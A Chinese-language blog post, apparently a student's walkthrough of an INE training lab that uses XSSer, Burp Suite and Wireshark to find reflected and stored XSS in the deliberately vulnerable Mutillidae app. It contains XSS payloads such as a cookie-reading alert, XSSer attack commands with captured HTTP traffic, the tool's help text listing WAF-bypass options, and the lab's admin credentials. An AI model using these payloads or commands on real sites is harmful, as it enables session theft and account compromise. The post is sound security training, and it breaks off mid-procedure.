---
layout: post
title: "Cross site scripting"
date: "2022-06-30"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - Penetration Testing Student
    - Web Attacks
---

# 概述
在本实验中，您将学习如何使用 XSSer 工具查找 XSS 漏洞并利用它。

# 任务
## 实验室环境
在这个实验室环境中，用户将获得对 Kali GUI 实例的访问权限。可以使用安装在 Kali 上的工具访问 Mutillidae Web 应用程序的实例，网址为 `http://demo.ine.local`
目标：使用 XSSer 对 Web 应用程序执行 XSS 攻击！

![mutillidae.png](/img/in-post/ine/mutillidae.png)

工具
该实验室的最佳工具是：
* XSSer
* 网络浏览器
* Burp Suite

# 我自己的思路
首先，检查目标是否存活。
```
root@INE:~# ping demo.ine.local -c 4
PING demo.ine.local (192.232.128.3) 56(84) bytes of data.
64 bytes from demo.ine.local (192.232.128.3): icmp_seq=1 ttl=64 time=0.055 ms
64 bytes from demo.ine.local (192.232.128.3): icmp_seq=2 ttl=64 time=0.053 ms
64 bytes from demo.ine.local (192.232.128.3): icmp_seq=3 ttl=64 time=0.052 ms
64 bytes from demo.ine.local (192.232.128.3): icmp_seq=4 ttl=64 time=0.042 ms

--- demo.ine.local ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3069ms
rtt min/avg/max/mdev = 0.042/0.050/0.055/0.005 ms
```

查看自己的网卡，eth1与目标在同一个网络。
```
root@INE:~# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.1.0.7  netmask 255.255.0.0  broadcast 10.1.255.255
        ether 02:42:0a:01:00:07  txqueuelen 0  (Ethernet)
        RX packets 3015  bytes 263407 (257.2 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 2330  bytes 2393035 (2.2 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.232.128.2  netmask 255.255.255.0  broadcast 192.232.128.255
        ether 02:42:c0:e8:80:02  txqueuelen 0  (Ethernet)
        RX packets 29  bytes 2550 (2.4 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 12  bytes 1064 (1.0 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 12412  bytes 30513361 (29.0 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 12412  bytes 30513361 (29.0 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```
在Github上找到[xsser](https://github.com/epsylon/xsser)。

可以看到其原理图：

![xsser.png](/img/in-post/ine/xsser.png)

首先，为指定的参数生成一个hash值。接着，该hash值会替代payload中的XSS部分。然后，攻击向量是`">PAYLOAD`，接着，将URL中指定参数的值替换为攻击向量。

访问
```
http://demo.ine.local/index.php?page=dns-lookup.php
```
在搜索框中输入`<h1>Hi</h1>`，`<script>alert('XSS');</script>`，`<script>alert(document.cookie)</script>`，可以看到，搜索结果被作为HTML和js代码执行了，说明存在反射性XSS漏洞。

用该工具进行手动验证，需要分析Burp Suite数据包。可以看到，POST参数`target_host`是注入点。

```
POST /index.php?page=dns-lookup.php HTTP/1.1
Host: demo.ine.local
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 102
Origin: http://demo.ine.local
Connection: close
Referer: http://demo.ine.local/index.php?page=dns-lookup.php
Cookie: PHPSESSID=5209qmpi53s7puacqamuib8c73; showhints=1
Upgrade-Insecure-Requests: 1

target_host=%3Cscript%3Ealert%28%27XSS%27%29%3B%3C%2Fscript%3E&dns-lookup-php-submit-button=Lookup+DNS
```

使用以下命令：

```
xsser -u 'http://demo.ine.local/index.php?page=dns-lookup.php' -p 'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS'
```

```
root@INE:~# xsser -u 'http://demo.ine.local/index.php?page=dns-lookup.php' -p 'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS'
===========================================================================

XSSer v1.8[4]: "The HiV€!" - (https://xsser.03c8.net) - 2010/2021 -> by psy

===========================================================================
Testing [XSS from URL]...
===========================================================================
===========================================================================
[*] Test: [ 1/1 ] <-> 2022-06-30 08:20:13.313820
===========================================================================

[+] Target: 

 [ http://demo.ine.local/index.php?page=dns-lookup.php ]

---------------------------------------------

[!] Hashing: 

 [ 7ca47cdaf2dee46c908fd67911f9aef0 ] : [ target_host ]

---------------------------------------------

[*] Trying: 

http://demo.ine.local/index.php?page=dns-lookup.php (POST: target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS)

---------------------------------------------

[+] Vulnerable(s): 

 [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]

---------------------------------------------

=============================================
[*] Injection(s) Results:
=============================================

 [FOUND !!!] -> [ 7ca47cdaf2dee46c908fd67911f9aef0 ] : [ target_host ]

===========================================================================
[*] Final Results:
===========================================================================

- Injections: 1
- Failed: 0
- Successful: 1
- Accur: 100.0 %

===========================================================================
[*] List of XSS injections:
===========================================================================

-> CONGRATULATIONS: You have found: [ 1 ] possible XSS vector! ;-)

---------------------

[+] Target: http://demo.ine.local/index.php?page=dns-lookup.php | target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS
[+] Vector: [ target_host ]
[!] Method: URL
[*] Hash: 7ca47cdaf2dee46c908fd67911f9aef0
[*] Payload: target_host=%22%3E7ca47cdaf2dee46c908fd67911f9aef0&dns-lookup-php-submit-button=Lookup+DNS
[!] Vulnerable: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
[!] Status: XSS FOUND! [WITHOUT --reverse-check VALIDATION!] 
 -------------------------------------------------- 

```
可以看到，该工具发现了XSS漏洞。使用Wireshark监听该过程：

请求：其中POST参数`target_host`的值为`">7ca47cdaf2dee46c908fd67911f9aef0`。
```
POST /index.php?page=dns-lookup.php HTTP/1.1
Host: demo.ine.local
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; AOL 8.0; Windows NT 5.1; SV1)
Accept: */*
Referer: 127.0.0.1
Content-Length: 90
Content-Type: application/x-www-form-urlencoded

target_host=%22%3E7ca47cdaf2dee46c908fd67911f9aef0&dns-lookup-php-submit-button=Lookup+DNSHTTP/1.1 200 OK
```

响应：从响应的页面中，工具提取到了该hash值。
```
Date: Thu, 30 Jun 2022 02:50:13 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.25
Set-Cookie: PHPSESSID=ircc2c3g8ouvs49bkdj78n6ad6; path=/
Set-Cookie: showhints=1
Logged-In-User: 
X-XSS-Protection: 0
Vary: Accept-Encoding
Transfer-Encoding: chunked
Content-Type: text/html

<div>Results for ">7ca47cdaf2dee46c908fd67911f9aef0</div>
```
一个疑问：工具如何判断攻击向量被执行了？

使用以下命令：

```
xsser -u 'http://demo.ine.local/index.php?page=dns-lookup.php' -p 'target_host=X1S&dns-lookup-php-submit-button=Lookup+DNS'
```
请求：POST参数`target_host`的值为`">27509654438967080688833640780508`。
```
POST /index.php?page=dns-lookup.php HTTP/1.1
Host: demo.ine.local
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36
Accept: */*
Referer: 127.0.0.1
Content-Length: 90
Content-Type: application/x-www-form-urlencoded

target_host=%22%3E27509654438967080688833640780508&dns-lookup-php-submit-button=Lookup+DNSHTTP/1.1 200 OK
```
响应：工具从响应中提取到了攻击向量。
```
Date: Thu, 30 Jun 2022 03:09:45 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.25
Set-Cookie: PHPSESSID=v6a2b9qiqf72hjru2bf7mvr7l6; path=/
Set-Cookie: showhints=1
Logged-In-User: 
X-XSS-Protection: 0
Vary: Accept-Encoding
Transfer-Encoding: chunked
Content-Type: text/html

<div>Results for ">27509654438967080688833640780508</div>

```
可以看到，`'XSS' (for hex.hash) or 'X1S' (for int.hash)`。

这样进行手工测试的效率低下，可以先获取所有页面。

访问
```
http://demo.ine.local/phpmyadmin.php
```
在`accounts`表格中，获得管理员账号和密码：

```
admin
adminpass
g0t r00t?
System
Administrator
```

在`http://demo.ine.local/index.php?page=./documentation/vulnerabilities.php`中，发现以下页面有反射性或存储型XSS漏洞。

```
add-to-your-blog.php
arbitrary-file-inclusion.php
back-button-discussion.php
browser-info.php
capture-data.php
captured-data.php
client-side-control-challenge.php
dns-lookup.php
document-viewer.php
header.php
index.php
login.php
repeater.php
set-background-color.php
show-log.php
source-viewer.php
styling.php
text-file-viewer.php
upload-file.php
user-agent-impersonation.php
user-info.php
user-info-xpath.php
user-poll.php
view-someones-blog.php
```

|Page|Injection point|
|---|---|
|add-to-your-blog.php|Cross site scripting on blog entry, Cross site scripting on logged in user name|
|arbitrary-file-inclusion.php|Reflected XSS via the value in the "page" URL parameter|
|back-button-discussion.php|Reflected XSS via referer HTTP header|
|browser-info.php|Reflected XSS via referer HTTP header, Reflected XSS via user-agent string HTTP header|
|capture-data.php|XSS via any GET, POST, or Cookie|
|captured-data.php|Stored XSS via any GET, POST, or Cookie sent to the capture data page. (capture-data.php page writes values captured to a table read by this page; captured-data.php (with a "d")) |
|client-side-control-challenge.php|Reflected cross-site scripting|
|dns-lookup.php|Cross site scripting on the host/ip field|
|document-viewer.php|Cross Site Scripting|
|header.php|XSS via logged in user name and signature|
|index.php|You can XSS the hints-enabled output in the menu because it takes input from the hints-enabled cookie value.|
|login.php|XSS via username field|
|repeater.php|HTML injection and XSS|
|set-background-color.php|Cascading style sheet injection and XSS via the color field.|
|show-log.php|XSS via the hostname, client IP, browser HTTP header, Referer HTTP header, and date fields.|
|source-viewer.php|Cross Site Scripting|
|styling.php|Cross Site Scripting|
|text-file-viewer.php|Cross site scripting|
|upload-file.php|Cross Site Scripting|
|user-agent-impersonation.php|Cross site scripting|
|user-info.php|XSS via any of the displayed fields. Inject the XSS on the register.php page.XSS via the username field|
|user-info-xpath.php|XSS via any of the displayed fields. Inject the XSS on the register.php page.XSS via the username field|
|user-poll.php|XSS via the choice parameter|
|view-someones-blog.php|Persistent XSS via any of the displayed fields. They are input on the add to your blog page. |


使用以下链接，可以访问到这些页面。将这些链接保存为文件`urls.txt`。

```
http://demo.ine.local/index.php?page=add-to-your-blog.php
http://demo.ine.local/index.php?page=arbitrary-file-inclusion.php
http://demo.ine.local/index.php?page=back-button-discussion.php
http://demo.ine.local/index.php?page=browser-info.php
http://demo.ine.local/index.php?page=capture-data.php
http://demo.ine.local/index.php?page=captured-data.php
http://demo.ine.local/index.php?page=client-side-control-challenge.php
http://demo.ine.local/index.php?page=dns-lookup.php
http://demo.ine.local/index.php?page=document-viewer.php
http://demo.ine.local/index.php?page=index.php
http://demo.ine.local/index.php?page=login.php
http://demo.ine.local/index.php?page=repeater.php
http://demo.ine.local/index.php?page=set-background-color.php
http://demo.ine.local/index.php?page=show-log.php
http://demo.ine.local/index.php?page=source-viewer.php
http://demo.ine.local/index.php?page=styling.php
http://demo.ine.local/index.php?page=text-file-viewer.php
http://demo.ine.local/index.php?page=upload-file.php
http://demo.ine.local/index.php?page=user-agent-impersonation.php
http://demo.ine.local/index.php?page=user-info.php
http://demo.ine.local/index.php?page=user-info-xpath.php
http://demo.ine.local/index.php?page=user-poll.php
http://demo.ine.local/index.php?page=view-someones-blog.php
```

xsser的使用实例：
```
-------------------------

[Info] This is because you aren't providing:

 At least one -payloader- using a keyword: 'XSS' (for hex.hash) or 'X1S' (for int.hash):

  - ex (GET): xsser -u 'https://target.com' -g '/path/profile.php?username=bob&surname=XSS&age=X1S&job=XSS'
  - ex (POST): xsser -u 'https://target.com/login.php' -p 'username=bob&password=XSS&captcha=X1S'

 Any extra attack(s) (Xsa, Xsr, Coo, Dorker, Crawler...):

  - ex (GET+Cookie): xsser -u 'https://target.com' -g '/path/id.php?=2' --Coo
  - ex (POST+XSA+XSR+Cookie): xsser -u 'https://target.com/login.php' -p 'username=admin&password=admin' --Xsa --Xsr --Coo
  - ex (Dorker): xsser -d 'news.php?id=' --Da
  - ex (Crawler): xsser -u 'https://target.com' -c 100 --Cl

 Or a mixture:

  - ex (GET+Manual): xsser -u 'https://target.com' -g '/users/profile.php?user=XSS&salary=X1S' --payload='<script>alert(XSS);</script>'
  - ex (POST+Manual): xsser -u 'https://target.com/login.asp' -p 'username=bob&password=XSS' --payload='}}%%&//<sc&ri/pt>(XSS)--;>'

  - ex (GET+Cookie): xsser -u 'https://target.com' -g '/login.asp?user=bob&password=XSS' --Coo
  - ex (POST+XSR+XSA): xsser -u 'https://target.com/login.asp' -p 'username=bob&password=XSS' --Xsr --Xsa

===========================================================================
```
针对每个链接，使用不同的参数：

|Page|Injection point|
|---|---|
|`http://demo.ine.local/index.php?page=add-to-your-blog.php`|Cross site scripting on blog entry, Cross site scripting on logged in user name|

我们使用admin, adminpass登录之后：
```
POST /index.php?page=add-to-your-blog.php HTTP/1.1
Host: demo.ine.local
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 84
Origin: http://demo.ine.local
Connection: close
Referer: http://demo.ine.local/index.php?page=add-to-your-blog.php
Cookie: PHPSESSID=4k9chfj9u63ttknssr9kb7qhi7; showhints=1; username=admin; uid=1
Upgrade-Insecure-Requests: 1

csrf-token=&blog_entry=Kali+Linux&add-to-your-blog-php-submit-button=Save+Blog+Entry
```

根据注入点描述，可以使用以下命令行参数：

该工具的不足，使用`--Coo`只能在Cookie字段插入payload，而使用`--cookie=COOKIE`又无法将cookie中的某一个参数插入XSS payload。

```
xsser -u 'http://demo.ine.local/index.php?page=add-to-your-blog.php' -p 'csrf-token=&blog_entry=XSS&add-to-your-blog-php-submit-button=Save+Blog+Entry' --Coo
```

```
POST /index.php?page=add-to-your-blog.php HTTP/1.1
Host: demo.ine.local
User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 7.0; InfoPath.3; .NET CLR 3.1.40767; Trident/6.0; en-IN)
Accept: */*
Referer: 127.0.0.1
Cookie: ">4dd6b0632a38dbc83028af691975ab06
Content-Length: 112
Content-Type: application/x-www-form-urlencoded

csrf-token=&blog_entry=%22%3E9b19abd89ca303cf0aae9b6184a02eda&add-to-your-blog-php-submit-button=Save+Blog+EntryHTTP/1.1 200 OK
Date: Thu, 30 Jun 2022 10:05:07 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.25
Set-Cookie: PHPSESSID=96hvd96dasv6ktbeg4gq8aov96; path=/
Set-Cookie: showhints=1
Logged-In-User: 
X-XSS-Protection: 0
Vary: Accept-Encoding
Transfer-Encoding: chunked
Content-Type: text/html
```

```
xsser -u 'http://demo.ine.local/index.php?page=add-to-your-blog.php' -p 'csrf-token=&blog_entry=XSS&add-to-your-blog-php-submit-button=Save+Blog+Entry' --cookie='PHPSESSID=4k9chfj9u63ttknssr9kb7qhi7; showhints=1; username=XSS; uid=1'
```

```
-> CONGRATULATIONS: You have found: [ 1 ] possible XSS vector! ;-)

---------------------

[+] Target: http://demo.ine.local/index.php?page=add-to-your-blog.php | csrf-token=&blog_entry=XSS&add-to-your-blog-php-submit-button=Save+Blog+Entry
[+] Vector: [ blog_entry ]
[!] Method: URL
[*] Hash: 263d5a87807136ca0309112b8390761e
[*] Payload: csrf-token=&blog_entry=%22%3E263d5a87807136ca0309112b8390761e&add-to-your-blog-php-submit-button=Save+Blog+Entry
[!] Vulnerable: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
[!] Status: XSS FOUND! [WITHOUT --reverse-check VALIDATION!] 
 -------------------------------------------------- 

```
可以看到，服务器判断登录用户是通过`PHPSESSID`，而不是Cookie中的username的值。虽然username是一个注入点，但该工具无法验证。
```
POST /index.php?page=add-to-your-blog.php HTTP/1.1
Host: demo.ine.local
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
Accept: */*
Referer: 127.0.0.1
Cookie: PHPSESSID=4k9chfj9u63ttknssr9kb7qhi7; showhints=1; username=XSS; uid=1
Content-Length: 112
Content-Type: application/x-www-form-urlencoded

csrf-token=&blog_entry=%22%3E263d5a87807136ca0309112b8390761e&add-to-your-blog-php-submit-button=Save+Blog+EntryHTTP/1.1 200 OK
Date: Thu, 30 Jun 2022 10:07:45 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.25
Logged-In-User: admin
X-XSS-Protection: 0
Vary: Accept-Encoding
Transfer-Encoding: chunked
Content-Type: text/html
```

|Page|Injection point|
|---|---|
|`http://demo.ine.local/index.php?page=back-button-discussion.php`|Reflected XSS via referer HTTP header|
|`http://demo.ine.local/index.php?page=browser-info.php`|Reflected XSS via referer HTTP header, Reflected XSS via user-agent string HTTP header|
|`http://demo.ine.local/index.php?page=capture-data.php`|XSS via any GET, POST, or Cookie|
|`http://demo.ine.local/index.php?page=captured-data.php`|Stored XSS via any GET, POST, or Cookie sent to the capture data page. (capture-data.php page writes values captured to a table read by this page; captured-data.php (with a "d")) |
|`http://demo.ine.local/index.php?page=client-side-control-challenge.php`|Reflected cross-site scripting|
|`http://demo.ine.local/index.php?page=dns-lookup.php`|Cross site scripting on the host/ip field|
|`http://demo.ine.local/index.php?page=document-viewer.php`|Cross Site Scripting|
|header.php|XSS via logged in user name and signature|
|`http://demo.ine.local/index.php?page=index.php`|You can XSS the hints-enabled output in the menu because it takes input from the hints-enabled cookie value.|
|`http://demo.ine.local/index.php?page=login.php`|XSS via username field|
|`http://demo.ine.local/index.php?page=repeater.php`|HTML injection and XSS|
|`http://demo.ine.local/index.php?page=set-background-color.php`|Cascading style sheet injection and XSS via the color field.|
|`http://demo.ine.local/index.php?page=show-log.php`|XSS via the hostname, client IP, browser HTTP header, Referer HTTP header, and date fields.|
|`http://demo.ine.local/index.php?page=source-viewer.php`|Cross Site Scripting|
|`http://demo.ine.local/index.php?page=styling.php`|Cross Site Scripting|
|`http://demo.ine.local/index.php?page=text-file-viewer.php`|Cross site scripting|
|`http://demo.ine.local/index.php?page=upload-file.php`|Cross Site Scripting|
|`http://demo.ine.local/index.php?page=user-agent-impersonation.php`|Cross site scripting|
|`http://demo.ine.local/index.php?page=user-info.php`|XSS via any of the displayed fields. Inject the XSS on the register.php page.XSS via the username field|
|`http://demo.ine.local/index.php?page=user-info-xpath.php`|XSS via any of the displayed fields. Inject the XSS on the register.php page.XSS via the username field|
|`http://demo.ine.local/index.php?page=user-poll.php`|XSS via the choice parameter|
|`http://demo.ine.local/index.php?page=view-someones-blog.php`|Persistent XSS via any of the displayed fields. They are input on the add to your blog page. |

# 解决方案
第 1 步：打开实验室链接以访问 Kali GUI 实例。

第 2 步：检查提供的机器/域是否可访问。

命令

```
ping demo.ine.local
```

```
root@INE:~# ping demo.ine.local -c 4
PING demo.ine.local (192.68.22.3) 56(84) bytes of data.
64 bytes from demo.ine.local (192.68.22.3): icmp_seq=1 ttl=64 time=0.056 ms
64 bytes from demo.ine.local (192.68.22.3): icmp_seq=2 ttl=64 time=0.062 ms
64 bytes from demo.ine.local (192.68.22.3): icmp_seq=3 ttl=64 time=0.043 ms
64 bytes from demo.ine.local (192.68.22.3): icmp_seq=4 ttl=64 time=0.047 ms

--- demo.ine.local ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3074ms
rtt min/avg/max/mdev = 0.043/0.052/0.062/0.007 ms

```

机器可达。

第 3 步：检查机器上打开的端口。

命令

```
nmap demo.ine.local
```

```
root@INE:~# nmap demo.ine.local
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-30 18:49 IST
Nmap scan report for demo.ine.local (192.68.22.3)
Host is up (0.0000080s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE
80/tcp   open  http
3306/tcp open  mysql
MAC Address: 02:42:C0:44:16:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.27 seconds
```

在机器上，端口 80 (HTTP) 和 3306 (MySQL) 是开放的。

第 4 步：检查 Kali 机器上存在的接口。

命令

```
ifconfig
```

```
root@INE:~# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.1.0.25  netmask 255.255.0.0  broadcast 10.1.255.255
        ether 02:42:0a:01:00:19  txqueuelen 0  (Ethernet)
        RX packets 4931  bytes 408280 (398.7 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 4088  bytes 2332584 (2.2 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.68.22.2  netmask 255.255.255.0  broadcast 192.68.22.255
        ether 02:42:c0:44:16:02  txqueuelen 0  (Ethernet)
        RX packets 1031  bytes 56586 (55.2 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1014  bytes 59060 (57.6 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 17764  bytes 36159361 (34.4 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 17764  bytes 36159361 (34.4 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

机器上有两个接口（不包括环回接口），即 eth0 和 eth1。

第 5 步：打开网络浏览器并浏览到demo.ine.local。

第 6 步：导航到跨站点脚本 (XSS) > 反射（一阶）> DNS 查找网页。

```
http://demo.ine.local/index.php?page=dns-lookup.php
```

第 7 步：在主机名/IP文本字段中输入“HelloWorld”，然后单击查找 DNS

输入的值会反映在网页上（如上面的屏幕截图中突出显示的那样）。

第 8 步：打开 Linux 终端并检查 XSSer 工具的使用情况。

```
root@INE:~# xsser --help
Usage: 

xsser [OPTIONS] [--all <url> |-u <url> |-i <file> |-d <dork> (options)|-l ] [-g <get> |-p <post> |-c <crawl> (options)]
[Request(s)] [Checker(s)] [Vector(s)] [Anti-antiXSS/IDS] [Bypasser(s)] [Technique(s)] [Final Injection(s)] [Reporting] {Miscellaneous}

Cross Site "Scripter" is an automatic -framework- to detect, exploit and
report XSS vulnerabilities in web-based applications.

Options:
  --version             show program's version number and exit
  -h, --help            show this help message and exit
  -s, --statistics      show advanced statistics output results
  -v, --verbose         active verbose mode output results
  --gtk                 launch XSSer GTK Interface
  --wizard              start Wizard Helper!

  *Special Features*:
    You can set Vector(s) and Bypasser(s) to build complex scripts for XSS
    code embedded. XST allows you to discover if target is vulnerable to
    'Cross Site Tracing' [CAPEC-107]:

    --imx=IMX           IMX - Create an image with XSS (--imx image.png)
    --fla=FLASH         FLA - Create a flash movie with XSS (--fla movie.swf)
    --xst=XST           XST - Cross Site Tracing (--xst http(s)://host.com)

  *Select Target(s)*:
    At least one of these options must to be specified to set the source
    to get target(s) urls from:

    --all=TARGET        Automatically audit an entire target
    -u URL, --url=URL   Enter target to audit
    -i READFILE         Read target(s) urls from file
    -d DORK             Search target(s) using a query (ex: 'news.php?id=')
    -l                  Search from a list of 'dorks'
    --De=DORK_ENGINE    Use this search engine (default: DuckDuckGo)
    --Da                Search massively using all search engines

  *Select type of HTTP/HTTPS Connection(s)*:
    These options can be used to specify which parameter(s) we want to use
    as payload(s). Set 'XSS' as keyword on the place(s) that you want to
    inject:

    -g GETDATA          Send payload using GET (ex: '/menu.php?id=XSS')
    -p POSTDATA         Send payload using POST (ex: 'foo=1&bar=XSS')
    -c CRAWLING         Number of urls to crawl on target(s): 1-99999
    --Cw=CRAWLER_WIDTH  Deeping level of crawler: 1-5 (default: 2)
    --Cl                Crawl only local target(s) urls (default: FALSE)

  *Configure Request(s)*:
    These options can be used to specify how to connect to the target(s)
    payload(s). You can choose multiple:

    --head              Send a HEAD request before start a test
    --cookie=COOKIE     Change your HTTP Cookie header
    --drop-cookie       Ignore Set-Cookie header from response
    --user-agent=AGENT  Change your HTTP User-Agent header (default: SPOOFED)
    --referer=REFERER   Use another HTTP Referer header (default: NONE)
    --xforw             Set your HTTP X-Forwarded-For with random IP values
    --xclient           Set your HTTP X-Client-IP with random IP values
    --headers=HEADERS   Extra HTTP headers newline separated
    --auth-type=ATYPE   HTTP Authentication type (Basic, Digest, GSS or NTLM)
    --auth-cred=ACRED   HTTP Authentication credentials (name:password)
    --check-tor         Check to see if Tor is used properly
    --proxy=PROXY       Use proxy server (tor: http://localhost:8118)
    --ignore-proxy      Ignore system default HTTP proxy
    --timeout=TIMEOUT   Select your timeout (default: 30)
    --retries=RETRIES   Retries when connection timeout (default: 1)
    --threads=THREADS   Maximum number of concurrent requests (default: 5)
    --delay=DELAY       Delay in seconds between each request (default: 0)
    --tcp-nodelay       Use the TCP_NODELAY option
    --follow-redirects  Follow server redirections (default: FALSE)
    --follow-limit=FLI  Set limit for redirection requests (default: 50)

  *Checker Systems*:
    These options are useful to know if your target is using filters
    against XSS attacks:

    --hash              Send a hash to check if target is repeating content
    --heuristic         Discover parameters filtered by using heuristics
    --discode=DISCODE   Set code on reply to discard an injection
    --checkaturl=ALT    Check reply using: <alternative url> [aka BLIND-XSS]
    --checkmethod=ALTM  Check reply using: GET or POST (default: GET)
    --checkatdata=ALD   Check reply using: <alternative payload>
    --reverse-check     Establish a reverse connection from target to XSSer

  *Select Vector(s)*:
    These options can be used to specify injection(s) code. Important if
    you don't want to inject a common XSS vector used by default. Choose
    only one option:

    --payload=SCRIPT    OWN   - Inject your own code
    --auto              AUTO  - Inject a list of vectors provided by XSSer

  *Select Payload(s)*:
    These options can be used to set the list of vectors provided by
    XSSer. Choose only if required:

    --auto-set=FZZ_NUM  ASET  - Limit of vectors to inject (default: 1293)
    --auto-info         AINFO - Select ONLY vectors with INFO (default: FALSE)
    --auto-random       ARAND - Set random to order (default: FALSE)

  *Anti-antiXSS Firewall rules*:
    These options can be used to try to bypass specific WAF/IDS products
    and some anti-XSS browser filters. Choose only if required:

    --Phpids0.6.5       PHPIDS (0.6.5) [ALL]
    --Phpids0.7         PHPIDS (0.7) [ALL]
    --Imperva           Imperva Incapsula [ALL]
    --Webknight         WebKnight (4.1) [Chrome]
    --F5bigip           F5 Big IP [Chrome + FF + Opera]
    --Barracuda         Barracuda WAF [ALL]
    --Modsec            Mod-Security [ALL]
    --Quickdefense      QuickDefense [Chrome]
    --Sucuri            SucuriWAF [ALL]
    --Firefox           Firefox 12 [& below]
    --Chrome            Chrome 19 & Firefox 12 [& below]
    --Opera             Opera 10.5 [& below]
    --Iexplorer         IExplorer 9 & Firefox 12 [& below]

  *Select Bypasser(s)*:
    These options can be used to encode vector(s) and try to bypass
    possible anti-XSS filters. They can be combined with other techniques:

    --Str               Use method String.FromCharCode()
    --Une               Use Unescape() function
    --Mix               Mix String.FromCharCode() and Unescape()
    --Dec               Use Decimal encoding
    --Hex               Use Hexadecimal encoding
    --Hes               Use Hexadecimal encoding with semicolons
    --Dwo               Encode IP addresses with DWORD
    --Doo               Encode IP addresses with Octal
    --Cem=CEM           Set different 'Character Encoding Mutations'
                        (reversing obfuscators) (ex: 'Mix,Une,Str,Hex')

  *Special Technique(s)*:
    These options can be used to inject code using different XSS
    techniques and fuzzing vectors. You can choose multiple:

    --Coo               COO - Cross Site Scripting Cookie injection
    --Xsa               XSA - Cross Site Agent Scripting
    --Xsr               XSR - Cross Site Referer Scripting
    --Dcp               DCP - Data Control Protocol injections
    --Dom               DOM - Document Object Model injections
    --Ind               IND - HTTP Response Splitting Induced code

  *Select Final injection(s)*:
    These options can be used to specify the final code to inject on
    vulnerable target(s). Important if you want to exploit 'on-the-wild'
    the vulnerabilities found. Choose only one option:

    --Fp=FINALPAYLOAD   OWN    - Exploit your own code
    --Fr=FINALREMOTE    REMOTE - Exploit a script -remotely-

  *Special Final injection(s)*:
    These options can be used to execute some 'special' injection(s) on
    vulnerable target(s). You can select multiple and combine them with
    your final code (except with DCP exploits):

    --Anchor            ANC  - Use 'Anchor Stealth' payloader (DOM shadows!)
    --B64               B64  - Base64 code encoding in META tag (rfc2397)
    --Onm               ONM  - Use onMouseMove() event
    --Ifr               IFR  - Use <iframe> source tag
    --Dos               DOS  - XSS (client) Denial of Service
    --Doss              DOSs - XSS (server) Denial of Service

  *Reporting*:
    --save              Export to file (XSSreport.raw)
    --xml=FILEXML       Export to XML (--xml file.xml)

  *Miscellaneous*:
    --silent            Inhibit console output results
    --alive=ISALIVE     Set limit of errors before check if target is alive
    --update            Check for latest stable version

```

第 9 步：配置 Firefox 以使用 Burp Suite 代理。

第 10 步：启动 Burp Suite！

在警告对话框中按确定按钮。

创建一个临时项目。

对于本实验，我们可以使用 Burp 的默认配置

注意：如果您收到“Burp Suite 已过期”消息。忽略此并单击“确定”按钮继续。

第 11 步：在Hostname/IP文本字段中输入“HelloWorld”，然后单击Lookup DNS。请求会被 burp suite 拦截

